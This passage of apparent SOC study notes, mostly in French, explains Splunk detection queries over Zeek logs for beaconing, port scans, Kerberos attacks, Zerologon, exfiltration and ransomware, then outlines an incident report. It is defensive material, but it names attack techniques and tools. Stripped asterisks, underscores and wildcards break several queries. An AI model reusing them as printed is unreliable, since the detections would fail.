streamstats calcule la différence de temps (timedelta) entre deux événements consécutifs, regroupés par IP source, IP destination et port de destination.
Calcul de l’intervalle moyen
eventstats calcule l’intervalle moyen (avg) entre les événements ainsi que leur nombre total (total), pour chaque couple source-destination.
Définition d’une plage d’intervalles acceptables
eval upper=avg1.1 et eval lower=avg0.9 fixent une marge de ±10% autour de l’intervalle moyen pour tenir compte des petites variations.
Filtrage des intervalles réguliers
where timedelta &gt; lower AND timedelta &lt; upper conserve les événements dont l’intervalle est proche de la moyenne.
Calcul du pourcentage de régularité
stats agrège les données et calcule le pourcentage (prcnt) d’événements respectant la plage régulière pour chaque connexion.
Filtrage sur le seuil de régularité
where prcnt &gt; 90 AND total &gt; 10 garde uniquement les connexions avec plus de 90% de régularité et au moins 10 événements — critères minimaux pour éviter les faux positifs.

Requête Splunk

index="cobaltstrikebeacon" sourcetype="bro:http:json" 
| sort 0 time
| streamstats current=f last(time) as prevtime by src, dest, destport
| eval timedelta = time - prevtime
| eventstats avg(timedelta) as avg, count as total by src, dest, destport
| eval upper=avg1.1
| eval lower=avg0.9
| where timedelta &gt; lower AND timedelta &lt; upper
| stats count, values(avg) as TimeInterval by src, dest, destport, total
| eval prcnt = (count/total)100
| where prcnt &gt; 90 AND total &gt; 10
Description des champs
index="cobaltstrikebeacon" : Filtre les événements provenant du bon index.
sourcetype="bro:http:json" : Spécifie les journaux HTTP de Zeek au format JSON.
sort 0 time : Trie les événements par ordre chronologique.
streamstats last(time) : Calcule le temps entre chaque événement pour un même flux (même src/dest/port).
eventstats avg(timedelta) : Calcule l’intervalle moyen et le nombre total d’événements pour chaque connexion.
eval upper / lower : Détermine une marge autour de l’intervalle moyen.
where timedelta &gt; lower AND timedelta &lt; upper : Ne garde que les intervalles réguliers.
stats : Agrège les résultats et calcule le pourcentage de régularité.
where prcnt &gt; 90 AND total &gt; 10 : Affiche uniquement les connexions présentant un comportement typique de beaconing.

Interprétation des résultats
Intervalle régulier : Si plus de 90% des communications d'une connexion se font à intervalles constants, cela indique possiblement un comportement de type beaconing*.
Seuil d’événements : Un minimum de 10 événements est requis pour éviter les fausses alertes dues à un faible volume de données.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Nmap Port Scanning</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80f5-b074-eec6e495c632"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">H. Détection des scans de ports Nmap via Splunk

Le scan de ports est une technique classique de reconnaissance utilisée par les attaquants pour identifier les services ouverts sur une cible. L’un des outils les plus couramment utilisés pour cela est Nmap.

Ce type de comportement se manifeste par des tentatives de connexion à plusieurs ports, souvent sans envoi de données (payload), dans un laps de temps très court. Grâce aux logs Zeek (anciennement Bro), on peut détecter ces tentatives suspectes en observant des connexions avec origbytes=0 (aucune donnée transmise) et en comptant le nombre de ports différents touchés.

Requête Splunk – Détection d’un scan de ports

index="cobaltstrikebeacon" sourcetype="bro:conn:json" origbytes=0 destip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8) 
| bin span=5m time 
| stats dc(destport) as numdestport by time, srcip, destip 
| where numdestport &gt;= 3
Explication de la requête
Source des données
index="cobaltstrikebeacon" : Index contenant les logs réseau capturés par Zeek.
sourcetype="bro:conn:json" : Logs JSON relatifs aux connexions réseau.
Filtrage des connexions sans payload
origbytes=0 : Ne conserve que les connexions où aucun octet n’a été transmis par l’émetteur. Cela indique souvent une tentative de scan ou de reconnaissance passive, typique d’outils comme Nmap.
Restriction aux plages IP internes
destip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8) : On ne surveille que les connexions visant des adresses IP privées, afin de détecter des comportements suspects au sein du réseau interne.
Agrégation temporelle
| bin span=5m time : Regroupe les événements par tranche de 5 minutes, ce qui permet d’identifier des activités regroupées dans le temps — comportement typique d’un scan.
Comptage des ports ciblés
| stats dc(destport) as numdestport by time, srcip, destip :
Compte le nombre de ports distincts touchés (dc(destport)) par une IP source (srcip) sur une IP de destination (destip) pendant une période de 5 minutes.
Seuil d’alerte
| where numdestport &gt;= 3 : Ne conserve que les cas où au moins trois ports différents ont été ciblés en 5 minutes. Cela correspond à un comportement suspect, pouvant indiquer un scan en phase de reconnaissance.

Interprétation des résultats
IP source suspecte (srcip) : L’adresse identifiée comme ayant tenté de scanner plusieurs ports sans transmettre de données.
Scan de reconnaissance : Les scans à faible bruit (ex : 3 ports seulement) sont souvent utilisés pour éviter la détection. Un seuil plus élevé (5 ou 10 ports) peut être utilisé pour détecter des scans plus agressifs.
Contexte interne : Un scan de ports interne peut indiquer qu’un poste compromis tente de cartographier le réseau.

Recommandations
Augmenter le seuil si trop de faux positifs
  Un numdest_port &gt; 3 peut être trop faible selon l’environnement ; augmenter à 5 ou 10 selon le contexte réseau.
Corrélation avec d’autres événements
  Associer cette détection à des tentatives d’exploitation, de connexion SSH, ou à des alertes IDS/IPS pour enrichir l’analyse.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Kerberos Brute Force Attacks.</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80ca-a45d-fb8345897875"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">G. Détection des attaques Brute Force Kerberos via Splunk

Une attaque brute force Kerberos consiste à envoyer en masse des requêtes d’authentification de type AS-REQ au KDC (Key Distribution Center), dans le but d’identifier des noms d’utilisateur valides. Même si l’authentification échoue, les messages d’erreur renvoyés permettent à un attaquant de deviner quels comptes existent réellement.

Ces tentatives sont généralement marquées par de nombreux échecs d’authentification, et certaines erreurs spécifiques permettent de distinguer les noms d’utilisateurs valides des invalides.

Requête Splunk – Détection de brute force Kerberos

index="kerberosbruteforce" sourcetype="bro:kerberos:json"
errormsg!=KDCERRPREAUTHREQUIRED
success="false" requesttype=AS
| bin time span=5m
| stats count dc(client) as "Utilisateurs uniques" values(errormsg) as "Messages d'erreur" by time, id.origh, id.resph
| where count&gt;30
Explication de la requête
Source des données
index="kerberosbruteforce" : Index contenant les logs Kerberos capturés par Zeek.
sourcetype="bro:kerberos:json" : Source au format JSON spécifique aux événements Kerberos.
Filtrage des erreurs pertinentes
errormsg!=KDCERRPREAUTHREQUIRED : Exclut les erreurs classiques de pré-authentification (ce type d'erreur indique souvent que l’utilisateur existe, ce qui est justement ce que cherchent les attaquants).
Cela permet de se concentrer sur les tentatives qui échouent sans atteindre le stade de la pré-authentification, typiques lors de tests sur des comptes inexistants.
Sélection des échecs d’authentification AS-REQ
success="false" : Ne garde que les tentatives d’authentification échouées.
requesttype=AS : Se focalise sur les requêtes de type AS-REQ, envoyées pour obtenir un TGT.
Regroupement temporel des événements
| bin time span=5m : Regroupe les événements par tranche de 5 minutes, ce qui permet de détecter les rafales de requêtes typiques des attaques brute force.
Statistiques par client et serveur
| stats count dc(client) as "Utilisateurs uniques" values(errormsg) as "Messages d'erreur" by time, id.origh, id.resph :
count : Nombre total de tentatives échouées par tranche de temps et par adresse IP.
dc(client) : Nombre de noms d’utilisateur distincts ciblés.
values(errormsg) : Liste des messages d’erreur retournés, utiles pour repérer une phase de reconnaissance ou de test d'existence de comptes.
Seuil d’alerte pour détection
| where count&gt;30 : Ne conserve que les cas où plus de 30 tentatives échouées sont observées en 5 minutes, ce qui est considéré comme suspect.

Interprétation des résultats
Volume élevé de tentatives échouées : Une origine unique (même IP) avec plus de 30 tentatives échouées dans un intervalle court indique fortement une attaque brute force.
Diversité des comptes ciblés : Un grand nombre d’utilisateurs différents suggère une tentative de découverte de comptes valides.
Analyse des messages d’erreur : Certains codes d’erreur peuvent confirmer que des utilisateurs existent, ce qui signifie que l’attaquant tente d'énumérer les comptes avant de passer à l’attaque.

À investiguer
Adresse IP source (id.origh) : Est-ce une machine interne ? Est-elle censée générer des requêtes Kerberos ?
Cible (id.resp_h) : Généralement un KDC, mais peut varier. Est-ce cohérent avec le trafic habituel ?
Réaction en cas d’alerte : Surveiller le poste, bloquer temporairement l’IP, renforcer la journalisation et activer des protections comme la limitation des tentatives.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Kerberoasting</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-806f-a805-d6c1012adc53"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">F. Détection de Kerberoasting via Splunk

Le Kerberoasting est une technique d’attaque où un attaquant possédant des identifiants valides dans le domaine demande des tickets TGS (Ticket Granting Service) pour des comptes de service (SPN). Ces tickets, souvent chiffrés avec l’algorithme RC4, peuvent ensuite être craqués hors ligne afin d’extraire les mots de passe en clair des comptes ciblés.

L’indicateur principal est la demande anormale de tickets TGS utilisant RC4, car cette méthode de chiffrement est privilégiée pour le craquage.

Requête Splunk – Détection de Kerberoasting

index="sharphound" sourcetype="bro:kerberos:json"
requesttype=TGS cipher="rc4-hmac" 
forwardable="true" renewable="true"
| table time, id.origh, id.resph, requesttype, cipher, forwardable, renewable, client, service
Explication de la requête
Source des données
index="sharphound" : Index contenant les événements de Kerberos, collectés par un outil comme SharpHound ou un système de monitoring réseau.
sourcetype="bro:kerberos:json" : Utilise les logs Zeek (anciennement Bro) pour les événements Kerberos au format JSON.
Filtrage des requêtes TGS chiffrées en RC4
requesttype=TGS : Ne retient que les requêtes de tickets de service.
cipher="rc4-hmac" : Sélectionne les tickets utilisant le chiffrement RC4, plus vulnérable, et donc privilégié par les attaquants.
Critères comportementaux suspects
forwardable="true" : Le ticket peut être réutilisé sur d’autres services.
renewable="true" : Le ticket peut être prolongé, ce qui est utile pour un attaquant cherchant une persistance.
Affichage clair des résultats
table time, id.origh, id.resph, requesttype, cipher, forwardable, renewable, client, service : Affiche les informations essentielles pour l’analyse :
Date et heure de l’événement.
IP source (client) et IP destination (souvent un contrôleur de domaine).
Type de requête, chiffrement utilisé.
Compte client et service cible.

Interprétation
Plusieurs requêtes TGS en RC4 : Une fréquence élevée de requêtes TGS avec RC4 par un même utilisateur ou hôte est hautement suspecte.
Comptes à privilèges ou services sensibles : Si le champ service cible un compte critique (SQL, Exchange, etc.), cela peut indiquer une tentative de Kerberoasting.
Activité centralisée sur un poste utilisateur : Des requêtes massives de TGS depuis un poste utilisateur (plutôt qu’un service ou serveur) sont anormales.

À investiguer
Client (id.orig_h) : S’agit-il d’une machine légitime ?
Compte (client) : Est-ce un compte utilisateur normal ou un compte de service détourné ?
Service ciblé (service) : Est-ce un compte ayant des privilèges élevés ou un rôle critique ?</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Golden Tickets</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8075-971f-c1c7c1f4afc8"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Strengths
Precision Targeting: Focusing on requesttype=="TGS" and uniquerequesttypes==1 accurately narrows in on possible forged activity.
Use of Zeek's bro:kerberos:json: Shows you're leveraging network-layer Kerberos visibility, which is less prone to tampering than Windows logs alone.
Binning by Time: Grouping by 1-minute intervals helps detect burst or pattern-based activity, which is key in attacker behavior.

Suggested Enhancements
Improve requesttypes=="TGS" Handling

values(requesttype) can return a multivalue field (array-like), so direct equality may be unreliable. Use mvcount() and mvindex() to improve robustness:

| where uniquerequesttypes==1 AND mvcount(requesttypes)==1 AND mvindex(requesttypes,0)=="TGS"
This ensures requesttypes truly only contains "TGS".

Add Host Context

If Zeek logs contain host or principal fields, include them for deeper triage:

| stats values(client), values(principal), values(requesttype) as requesttypes, dc(requesttype) as uniquerequesttypes by time, id.origh, id.resph
Add Baseline for Alert Tuning

To avoid false positives, consider correlating results with a list of known service accounts (e.g., via lookup serviceaccounts.csv) to suppress legitimate batch activity.

Optional: Include Count for Volume

Adding request count per interval can reveal abnormal ticket request volume:

| stats count as totalrequests, values(client), values(requesttype) as requesttypes, dc(requesttype) as uniquerequesttypes by time, id.origh, id.resph
Then filter with something like:

| where totalrequests &gt; 10 AND uniquerequesttypes==1 AND mvcount(requesttypes)==1 AND mvindex(requesttypes,0)=="TGS"
Final Enhanced Query Example

index="goldenticketattack" sourcetype="bro:kerberos:json"
| where client!="-"
| bin time span=1m
| stats count as totalrequests, values(client), values(requesttype) as requesttypes, dc(requesttype) as uniquerequesttypes by time, id.origh, id.resph
| where totalrequests &gt; 10 AND uniquerequesttypes==1 AND mvcount(requesttypes)==1 AND mvindex(requesttypes,0)=="TGS"
This version is more robust and better tuned for production alerts.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Cobalt Strike's PSExec</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8034-a4fb-c16bb493ddce"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Requête Splunk pour la détection de l’outil PSExec de Cobalt Strike

La requête suivante permet de repérer les comportements caractéristiques de l’utilisation de l’outil psexec de Cobalt Strike. Celui-ci s’appuie sur le protocole SMB pour déposer et exécuter des fichiers (typiquement des exécutables) sur une machine cible, en accédant à des partages administratifs comme C$ ou ADMIN$.
Requête Splunk

index="cobaltstrikepsexec"
sourcetype="bro:smbfiles:json"
action="SMB::FILEOPEN" 
name IN (".exe", ".dll", ".bat")
path IN ("\\c$", "\\ADMIN$")
size &gt; 0
Détail de la requête
Sélection de la source de données
index="cobaltstrikepsexec" : Cible l’index contenant les événements liés aux activités de psexec.
sourcetype="bro:smbfiles:json" : Filtre les événements SMB enregistrés par Zeek/Bro, au format JSON, relatifs aux opérations sur fichiers via SMB.
Filtrage des actions d’ouverture de fichier
action="SMB::FILEOPEN" : Ne conserve que les événements où un fichier a été ouvert via SMB — une action typique lors du déploiement d’un binaire avec psexec.
Types de fichiers suspects
name IN (".exe", ".dll", ".bat") : Cible les fichiers exécutables, DLL et scripts batch — types couramment utilisés pour déposer des charges malveillantes.
Accès aux partages administratifs
path IN ("\\c$", "\\ADMIN$") : Se concentre sur les chemins administratifs Windows, comme C$ et ADMIN$, que psexec utilise souvent pour transférer des fichiers.
Fichiers non vides
size &gt; 0 : Exclut les fichiers vides pour ne garder que ceux susceptibles de contenir une véritable charge utile.

Stratégie de détection et interprétation

Cette requête permet d’identifier une séquence d’actions typique de l’utilisation de psexec par Cobalt Strike :
Déploiement de payload à distance : L’ouverture d’un fichier .exe, .dll ou .bat sur un partage comme C$ ou ADMIN$, via SMB, suggère un déploiement automatisé à l’aide d’un outil d’administration distante.
Filtrage efficace du trafic légitime : En ciblant les fichiers exécutables non vides sur des partages administratifs, on limite les faux positifs dus aux opérations légitimes ou aux fichiers inoffensifs.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Zerologon</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8098-aa6c-fd4a9b84fbb4"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Splunk Query for Detecting Zerologon Attack

index="zerologon" endpoint="netlogon" sourcetype="bro:dcerpc:json"
| bin time span=1m
| where operation == "NetrServerReqChallenge" OR operation == "NetrServerAuthenticate3" OR operation == "NetrServerPasswordSet2"
| stats count values(operation) as operationvalues dc(operation) as uniqueoperations by time, id.origh, id.resph
| where uniqueoperations &gt;= 2 AND count&gt;100
Query Breakdown:
Data Source:
index="zerologon": Filters for Zerologon-related events.
endpoint="netlogon": Focuses on Netlogon traffic, exploited in Zerologon.
sourcetype="bro:dcerpc:json": Captures DCE-RPC logs from Zeek.
Time Binning:
| bin time span=1m: Groups events in one-minute intervals to detect rapid patterns.
Key Operations Filtering:
Filters for Zerologon-related operations: NetrServerReqChallenge, NetrServerAuthenticate3, and NetrServerPasswordSet2.
Statistical Analysis:
| stats count values(operation) as operationvalues dc(operation) as uniqueoperations by time, id.origh, id.resph: Aggregates by time and IPs, counting occurrences and distinct operations.
Anomalous Pattern Detection:
| where uniqueoperations &gt;= 2 AND count&gt;100: Flags cases with multiple operations and high counts, indicating suspicious activity typical of a Zerologon attack.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Exfiltration (HTTP)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-803a-b111-ffe91d4667c9"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Requête Splunk pour détecter une exfiltration de données via HTTP

index="cobaltstrikeexfiltrationhttp" sourcetype="bro:http:json" method=POST
| stats sum(requestbodylen) as TotalBytes by src, dest, destport
| eval TotalBytes = TotalBytes/1024/1024
Explication de la requête
Sélection de la source de données :
index="cobaltstrikeexfiltrationhttp" : cible les logs présents dans l’index dédié à la détection d’exfiltration HTTP potentielle liée à Cobalt Strike.
sourcetype="bro:http:json" : sélectionne uniquement les logs HTTP générés par Zeek (anciennement Bro) au format JSON.
method=POST : filtre pour ne garder que les requêtes HTTP de type POST, car ce type de méthode est fréquemment utilisé pour exfiltrer des données dans le corps des requêtes.
Agrégation du volume de données transférées :
| stats sum(requestbodylen) as TotalBytes by src, dest, destport : calcule la somme de la taille des corps des requêtes POST (requestbodylen) envoyés par chaque IP source (src) vers chaque IP de destination (dest) et port de destination (dest_port).
Cela permet de repérer des transferts anormalement volumineux de données vers certaines destinations, ce qui peut révéler une exfiltration.
Conversion de l’unité de mesure :
| eval TotalBytes = TotalBytes/1024/1024 : convertit la taille totale des données transférées depuis les octets vers les mégaoctets (Mo) pour une lecture plus intuitive.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Exfiltration (DNS)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80f2-89fb-c8674cff4328"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Requête Splunk pour détecter une exfiltration de données via DNS

index=dnsexf sourcetype="bro:dns:json"
| eval lenquery=len(query)
| search lenquery&gt;=40 AND query!=".ip6.arpa" AND query!="amazonaws.com" AND query!=".googlecast." AND query!="ldap."
| bin time span=24h
| stats count(query) as reqbyday by time, id.origh, id.resph
| where reqbyday&gt;60
| table time, id.origh, id.resph, reqbyday
Explication de la requête
Sélection des données pertinentes :
index=dnsexf sourcetype="bro:dns:json" : filtre les logs pour ne garder que ceux relatifs au DNS (au format JSON de Bro/Zeek DNS) dans l’index dnsexf, utilisé ici pour surveiller une éventuelle exfiltration de données par DNS.
Calcul de la longueur des requêtes DNS :
| eval lenquery=len(query) : calcule la longueur de chaque requête DNS et stocke cette valeur dans un nouveau champ lenquery. Les requêtes longues peuvent contenir des données encodées ou chiffrées.
Filtrage sur la longueur des requêtes et exclusion de domaines légitimes fréquents :
| search lenquery&gt;=40 AND query!=".ip6.arpa" AND query!="amazonaws.com" AND query!=".googlecast." AND query!="ldap." :
conserve uniquement les requêtes DNS dont la longueur est supérieure ou égale à 40 caractères,
exclut les domaines connus et bénins, comme les requêtes de résolution IPv6 (ip6.arpa), les services cloud (amazonaws.com), les appareils Chromecast (googlecast) et les requêtes LDAP.
Regroupement des événements par tranche de 24 heures :
| bin time span=24h : regroupe les événements par jour pour faciliter l’analyse temporelle.
Comptage des requêtes par jour et par hôte :
| stats count(query) as reqbyday by time, id.origh, id.resph : compte le nombre total de requêtes DNS par jour (reqbyday), en les regroupant par adresse IP source (id.origh) et destination (id.resph).
Identification d’activités suspectes :
| where reqbyday&gt;60 : ne garde que les hôtes ayant généré plus de 60 requêtes DNS par jour — un comportement potentiellement indicatif d’exfiltration.
Affichage des résultats :
| table time, id.origh, id.resph, reqby_day : affiche les résultats dans un tableau avec la date, l’IP source, l’IP de destination et le nombre de requêtes par jour, pour une analyse simplifiée.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Ransomware</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8028-bb6f-fd4b026ac2ff"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Détection des ransomwares avec Splunk
1. Détection des opérations excessives d'ouverture et de renommage de fichiers

Ce type de comportement est souvent observé lors d'attaques par ransomware, où de nombreux fichiers sont ouverts et renommés dans de courtes périodes.
Requête Splunk

index="ransomwareopenrenamesodinokibi" sourcetype="bro:smbfiles:json" 
| where action IN ("SMB::FILEOPEN", "SMB::FILERENAME")
| bin time span=5m
| stats count by time, source, action
| where count&gt;30 
| stats sum(count) as count values(action) dc(action) as uniqactions by time, source
| where uniqactions==2 AND count&gt;100
Explication de la requête
Filtrage des événements : La recherche se limite aux actions FILEOPEN et FILERENAME dans l'index spécifié.
Groupement par intervalles de 5 minutes : Les événements sont regroupés par périodes de 5 minutes pour détecter des pics d'activité.
Comptage des événements : Les actions sont comptées par source dans chaque période de 5 minutes, avec un seuil de 30 actions.
Agrégation des résultats : Vérifie si les actions FILEOPEN et FILERENAME sont présentes dans les 100 premières occurrences, ce qui peut indiquer un comportement de ransomware.

2. Détection du renommage excessif de fichiers avec de nouvelles extensions

Les ransomwares ont souvent pour habitude de renommer les fichiers en leur ajoutant des extensions uniques pour indiquer qu'ils ont été chiffrés.
Requête Splunk

index="ransomwarenewfileextensionctblocker" sourcetype="bro:smbfiles:json" action="SMB::FILERENAME" 
| bin time span=5m
| rex field="name" "\.(?&lt;newfilenameextension&gt;[^\.]$)"
| rex field="prevname" "\.(?&lt;oldfilenameextension&gt;[^\.]$)"
| stats count by time, id.origh, id.respp, name, source, oldfilenameextension, newfilenameextension
| where newfilenameextension!=oldfilenameextension
| stats count by time, id.origh, id.respp, source, newfilenameextension
| where count&gt;20
| sort -count
Explication de la requête
Filtrage par action et temps : Limite les résultats aux événements de renommage de fichiers dans des fenêtres de 5 minutes.
Extraction des extensions : Utilise des expressions régulières pour extraire les extensions des fichiers avant et après le renommage.
Filtrage des changements d'extension : Conserve uniquement les événements où l'extension du fichier a changé.
Agrégation des résultats : Compte les occurrences des nouveaux noms de fichiers par source et newfilenameextension.
Détection de ransomware : Identifie les cas où plus de 20 fichiers ont été renommés avec la même nouvelle extension dans un intervalle de 5 minutes.

Ressources supplémentaires pour la détection des ransomwares

Ces ressources peuvent fournir des informations utiles pour détecter les ransomwares en se basant sur les extensions de fichiers et les motifs de noms connus :
[Ransomware Extensions Spreadsheet](https://docs.google.com/spreadsheets/d/e/2PACX-1vRCVzG9JCzak3hNqqrVCTQQIzH0ty77BWiLEbDu-q9oxkhAamqnlYgtQ4gF85pF6j6g3GmQxivuvO1U/pubhtml)
[Corelight’s Detect-Ransomware-Filenames Repository](https://github.com/corelight/detect-ransomware-filenames)
[Experiant’s FSRM Ransomware Extensions](https://fsrm.experiant.ca/)</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Security Incident Reporting</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Incident Reporting Process</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-802b-9909-da62f0bbea42"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Aperçu

Le rapport d'incident de sécurité est essentiel dans le paysage technologique actuel pour protéger les actifs organisationnels et répondre efficacement aux menaces. Ce processus permet de documenter les incidents, d'apprendre des événements passés et d'améliorer les capacités de réponse futures.
Importance

Le rapport d'incident :
Relie la détection à l'atténuation.
Crée un référentiel des leçons tirées.
Informe l'évaluation des risques, la conformité et la sensibilisation des parties prenantes.
Identification et Catégorisation des Incidents
Sources principales :
Outils de sécurité : IDS, IPS, EDR, XDR, SIEM, antivirus, données NetFlow.
Observation humaine : Rapports d'employés concernant des activités inhabituelles.
Notifications de tiers : Alertes provenant de partenaires, fournisseurs ou clients.
Types d'incidents :
Malware : Virus, ransomware.
Phishing : Tentatives de vol de données sensibles.
DDoS : Attaques par saturation pour perturber les services.
Accès non autorisé : Entrée non autorisée dans les systèmes ou données.
Fuite de données : Exposition accidentelle de données.
Breach physique : Accès physique non autorisé.
Niveaux de sévérité :
Critique (P1) : Risque immédiat pour les fonctions principales, nécessite une action urgente.
Élevé (P2) : Risque important, nécessite une attention rapide.
Moyenne (P3) : Risque modéré, une réponse en temps utile est conseillée.
Faible (P4) : Problèmes mineurs, peuvent être gérés dans les opérations quotidiennes.
Processus de Rapport d'Incident
Détection et reconnaissance : Identification initiale, souvent par des alertes automatisées ou des observations humaines.
Analyse préliminaire : Évaluer la portée et l'impact potentiel ; catégoriser l'incident.
Enregistrement de l'incident : Documenter tous les détails. Utiliser des outils comme JIRA, TheHive ou des alternatives plus simples.
Notification :
Interne : Informer les équipes IT, juridiques, PR et exécutives.
Externe : Si nécessaire, notifier les clients, partenaires, autorités réglementaires ou le public.
Investigation et rapport détaillé : Réaliser une analyse approfondie de l'incident.
Création du rapport final : Fournir un rapport complet aux parties prenantes, détaillant l'incident, ses causes et les mesures correctives.
Boucle de rétroaction : Analyse post-incident pour améliorer la préparation à la réponse.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Elements of a Proper Incident Report</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80fd-9a18-c1a724e76916"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Résumé Exécutif

Le résumé exécutif sert de point d'entrée accessible à un large public, y compris aux parties prenantes non techniques. Cette section fournit une vue d'ensemble concise, les principaux résultats, les actions immédiates prises et l'impact sur les parties prenantes. De nombreuses parties prenantes ne liront que cette section, il est donc essentiel d'assurer une grande clarté.
Section  |  Description
ID de l'incident : Identifiant unique de l'incident.
Vue d'ensemble de l'incident : Résumé des événements de l'incident (y compris la détection initiale) et du type d'attaque (par exemple, ransomware, violation de données). Inclure l'heure estimée, la durée, les systèmes/données affectés et l'état (en cours, résolu ou escaladé).
Principaux résultats : Résumé de la cause principale et des vulnérabilités spécifiques exploitées. Mentionner les données compromises ou exfiltrées.
Actions immédiates prises : Détail des actions prises, comme l'isolement des systèmes, l'identification de la cause principale et l'engagement des services tiers.
Impact sur les parties prenantes : Évaluer l'impact sur les clients, les employés, les informations propriétaires et les conséquences financières potentielles.
Analyse Technique

Analyse approfondie des événements techniques pendant l'incident. Cette section devrait couvrir :
Systèmes et Données Affectés
Lister tous les systèmes compromis ou potentiellement accessibles. Si des données ont été exfiltrées, spécifier la quantité.
Sources de Preuves et Analyse
Inclure toutes les preuves analysées et la méthodologie (par exemple, les journaux d'accès Web). Mettre l'accent sur l'intégrité des preuves avec des hachages lorsque nécessaire.
Indicateurs de Compromission (IoC)
Fournir les IoC (par exemple, processus inhabituels, trafic sortant) pour la recherche de menaces ou l'attribution à des acteurs de menace spécifiques.
Analyse de la Cause Racine
Explication détaillée des vulnérabilités exploitées, des causes profondes et des points de défaillance.
Chronologie Technique

Documenter les événements clés, y compris :
Reconnaissance
Compromission initiale
Communications C2
Énumération, mouvement latéral
Accès et exfiltration de données
Déploiement de malwares (Injection de processus, persistance)
Temps de confinement, d'éradication et de récupération
Nature de l'attaque
Explication du type d'attaque, des TTP (tactiques, techniques et procédures) utilisées par l'attaquant.
Analyse de l'Impact

Évaluer les effets négatifs sur les données, les opérations et la réputation. Cela inclut la quantification et la qualification des dommages, les implications pour l'entreprise (par exemple, pertes financières), les pénalités réglementaires et les impacts sur la réputation.
Analyse de la Réponse et de la Récupération
Actions Immédiates de Réponse

Révocation d'accès
Comptes/Systèmes compromis identifiés : Détail des outils et méthodes utilisés pour identifier les entités compromises.
Cadre temporel : Horodatage précis de la détection et de la révocation.
Méthode de révocation : Explication des méthodes de révocation (par exemple, désactivation des comptes, modification des règles du pare-feu).
Impact : Prévention de toute autre compromission ou exfiltration.

Stratégie de Confinement
Confinement à court terme : Isolement des systèmes affectés du réseau.
Confinement à long terme : Mesures stratégiques comme la segmentation ou la mise en œuvre de la sécurité zero-trust.
Efficacité : Évaluation des mesures de confinement.
Mesures d'Éradication

Suppression de Malware
Identification : Procédures utilisées pour détecter le malware, y compris les outils EDR ou l'analyse forensic.
Techniques de suppression : Outils spécifiques ou méthodes manuelles utilisées.
Vérification : Étapes pour assurer la suppression complète, comme la vérification des sommes de contrôle.

Patching du Système
Identification des vulnérabilités : Méthodes de découverte des vulnérabilités (par exemple, CVEs).
Gestion des patches : Étapes pour tester, déployer et vérifier les patches.
Procédures de retour en arrière : Procédures en cas d'instabilité après déploiement.
Étapes de Récupération

Restauration des données
Validation des sauvegardes : Procédures pour confirmer l'intégrité des sauvegardes.
Processus de restauration : Étapes détaillées pour la récupération des données.
Vérifications de l'intégrité des données : Vérification de l'exactitude des données restaurées.

Validation du système
Mesures de sécurité : Assurer la sécurité du système par la reconfiguration ou la mise à jour des IDS.
Contrôles opérationnels : Vérification que les systèmes fonctionnent comme prévu.
Actions Post-Incident
Surveillance
Plans de surveillance améliorés : Plans détaillés pour la surveillance future afin de détecter des vulnérabilités similaires.
Outils et technologies : Outils spécifiques intégrés dans la stratégie de surveillance.
Leçons Tirées
Analyse des lacunes : Évaluation des mesures de sécurité échouées.
Recommandations pour l'amélioration : Étapes concrètes pour renforcer les défenses.
Stratégie future : Changements à long terme dans la politique, l'architecture ou la formation.
Diagrammes

Utiliser des visuels pour simplifier les complexités de l'incident :
Diagramme de flux de l'incident : Progression de l'attaque du point d'entrée à la propagation du réseau.
Carte des systèmes affectés : Topologie réseau mettant en évidence les nœuds compromis.
Diagramme du vecteur d'attaque : Diagramme du mouvement de l'attaquant et de son chemin d'exploitation.
Annexes

Fournit un contexte supplémentaire, des preuves ou des détails techniques. Cette section sert de base pour la vérification et ajoute de la profondeur au récit principal du rapport.

Les contenus peuvent inclure :
Fichiers journaux
